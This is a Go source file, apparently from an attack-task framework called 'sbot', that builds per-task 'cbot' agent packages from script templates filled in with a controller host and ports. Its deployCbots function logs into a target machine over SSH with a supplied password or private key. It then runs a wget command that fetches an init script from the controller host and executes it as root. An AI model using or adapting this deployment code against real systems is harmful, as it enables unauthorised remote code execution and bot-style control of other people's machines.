package handler

import (
	"fmt"
	"github.com/sbot/proto/model"
	"github.com/sbot/store"
	"github.com/sbot/utils/fileutils"
	"github.com/sbot/utils/netutils"
	"github.com/sbot/utils/sshutils"
	"github.com/sbot/utils/uuid"
	"os"
	"text/template"

	"path/filepath"
	"time"
)

const (
	AttackSourceQueueCapacity = 100
	AttackQueueCapacity       = 10
	AttackThreads             = 100
)

type AttackTaskHandler struct {
	cbotStoreDir string

	attackTaskCbotStoreDir string

	rhost string

	rport int

	fport int

	db store.Store
}

type TaskTemplateData struct {
	TaskId  string
	RHost   string
	RPort   int
	FPort   int
	Threads int
	Scap    int
	Acap    int
}

func NewAttackTaskHandler(cbotStoreDir, attackTaskCbotStoreDir, rhost string, rport, fport int, db store.Store) *AttackTaskHandler {

	return &AttackTaskHandler{
		cbotStoreDir:           cbotStoreDir,
		attackTaskCbotStoreDir: attackTaskCbotStoreDir,
		rhost:                  rhost,
		rport:                  rport,
		fport:                  fport,
		db:                     db,
	}
}

func (ath *AttackTaskHandler) getCbotNames(osType model.OsType) (cbotFpath string, initFpath string, startFPath string) {

	var cbot, init, start string

	switch osType {

	case model.OsType_Linux:
		cbot = "cbot_linux"
		init = "init.sh"
		start = "start.sh"

	case model.OsType_Windows:
		cbot = "cbot_windows"
		init = "init.ps1"
		start = "start.ps1"

	default:
		return "", "", ""
	}

	return cbot,init,start

}

func (ath *AttackTaskHandler) makeFileFromTemplate(tdata *TaskTemplateData, tfile string, storeFile string) error {

	file, err := os.OpenFile(storeFile, os.O_CREATE|os.O_RDWR|os.O_TRUNC, 0755)

	if err != nil {

		errS := fmt.Sprintf("Cannot open file:%s to store content from template file:%s,err:%v", storeFile, tfile, err)
		log.Error(errS)
		return fmt.Errorf("%s", errS)

	}
	defer file.Close()

	t, err := template.ParseFiles(tfile)
	if err != nil {

		errS := fmt.Sprintf("Cannot parse template file:%s,err:%v", tfile, err)

		log.Error(errS)
		return fmt.Errorf("%s", errS)
	}

	if err := t.Execute(file, tdata); err != nil {

		errS := fmt.Sprintf("Cannot write template file:%s parse resutls,err:%v", tfile, err)
		log.Error(errS)
		return fmt.Errorf("%s", errS)
	}

	return nil
}

func (ath *AttackTaskHandler) makeCbot(taskId string, request *model.CreateAttackTaskRequest) error {

	zipFiles := make([]string, 0)

	cbot, init, start := ath.getCbotNames(request.OsType)

	if cbot == "" {

		errS := fmt.Sprintf("UNSurport os type:%s", request.OsType.String())
		log.Error(errS)
		return fmt.Errorf("%s", errS)
	}

	cbotFile := filepath.Join(ath.cbotStoreDir, cbot)

	cbotPathTaskFile := filepath.Join(ath.attackTaskCbotStoreDir, taskId, cbot)

	if !fileutils.FileIsExisted(cbotFile) {

		errS := fmt.Sprintf("The cbot file:%s not existed", cbotFile)
		log.Error(errS)

		return fmt.Errorf("%s", errS)
	}

	zipFiles = append(zipFiles, cbotPathTaskFile)

	//copy cbot to tasks
	if err := fileutils.FileCopy(cbotPathTaskFile, cbotFile); err != nil {

		errS := fmt.Sprintf("Cannot copy cbot file:%s to target path:%s,err:%v", cbotFile, cbotPathTaskFile, err)

		log.Error(errS)

		return fmt.Errorf("%s", errS)
	}

	tdata := &TaskTemplateData{
		TaskId:  taskId,
		RHost:   ath.rhost,
		RPort:   ath.rport,
		FPort:   ath.fport,
		Threads: AttackThreads,
		Scap:    AttackSourceQueueCapacity,
		Acap:    AttackQueueCapacity,
	}

	initTFile := filepath.Join(ath.cbotStoreDir, fmt.Sprintf("%s.tpl", init))
	if fileutils.FileIsExisted(initTFile) {

		initFile := filepath.Join(ath.attackTaskCbotStoreDir, taskId, init)

		if err := ath.makeFileFromTemplate(tdata, initTFile, initFile); err != nil {

			return err
		}
		zipFiles = append(zipFiles, initFile)

	}

	startTFile := filepath.Join(ath.cbotStoreDir, fmt.Sprintf("%s.tpl", start))
	if fileutils.FileIsExisted(startTFile) {

		startFile := filepath.Join(ath.attackTaskCbotStoreDir, taskId, start)

		if err := ath.makeFileFromTemplate(tdata, startTFile, startFile); err != nil {

			return err
		}

		zipFiles = append(zipFiles, startFile)

	}

	zipFile := filepath.Join(ath.attackTaskCbotStoreDir, taskId, fmt.Sprintf("%s.zip", cbot))

	if err := fileutils.ZipFiles(zipFile, "", zipFiles, false); err != nil {

		errS := fmt.Sprintf("Cannot make zip file:%s,err:%v", zipFile, err)

		log.Error(errS)

		return fmt.Errorf(errS)
	}

	return nil
}

func (ath *AttackTaskHandler) writeDB(taskId string, request *model.CreateAttackTaskRequest) error {

	now := time.Now().UnixNano() / (1000 * 1000)
	return ath.db.Put(taskId, uint64(now), request)

}

//for linux auto deploy
func (ath *AttackTaskHandler) deployCbots(taskId string, request *model.CreateAttackTaskRequest) {

	var sshClient *sshutils.SSHClient
	var err error

	upc := &netutils.URLPathCrypt{
		TaskId:       taskId,
		Fname:        "init.sh",
		AttackType:   "NoAttack",
		AttackIP:     ath.rhost,
		TargetIP:     request.Host,
		TargetPort:   int(request.Port),
		DownloadTool: "wget",
	}

	url := fmt.Sprintf("http://%s:%d/%s", ath.rhost, ath.fport, netutils.URLPathCryptToString(upc))

	cmd := fmt.Sprintf("wget %s -O /var/tmp/init.sh;bash /var/tmp/init.sh %s", url, "root")

	if request.Passwd != "" {

		sshClient, err = sshutils.LoginWithPasswd(request.Host, int(request.Port), request.User, request.Passwd, 50000)

		if err != nil {
			return
		}

	} else if request.PrivateKey != "" {

		sshClient, err = sshutils.LoginWithPrivKey(request.Host, int(request.Port), request.User, request.PrivateKey, 50000)

		if err != nil {

			return
		}

	} else {

		return
	}

	defer sshClient.Close()

	sshClient.RunCmd(cmd)

}

func (ath *AttackTaskHandler) Handle(request *model.CreateAttackTaskRequest) (string, error) {

	taskId := fmt.Sprintf("taskId_%s", uuid.UUID())

	if err := ath.makeCbot(taskId, request); err != nil {

		return "", err
	}

	if err := ath.writeDB(taskId, request); err != nil {

		//delete cbots made

		fileutils.DeleteFiles(filepath.Join(ath.attackTaskCbotStoreDir, taskId))
		return "", err
	}

	if request.OsType == model.OsType_Linux {

		ath.deployCbots(taskId, request)
	}

	return taskId, nil
}
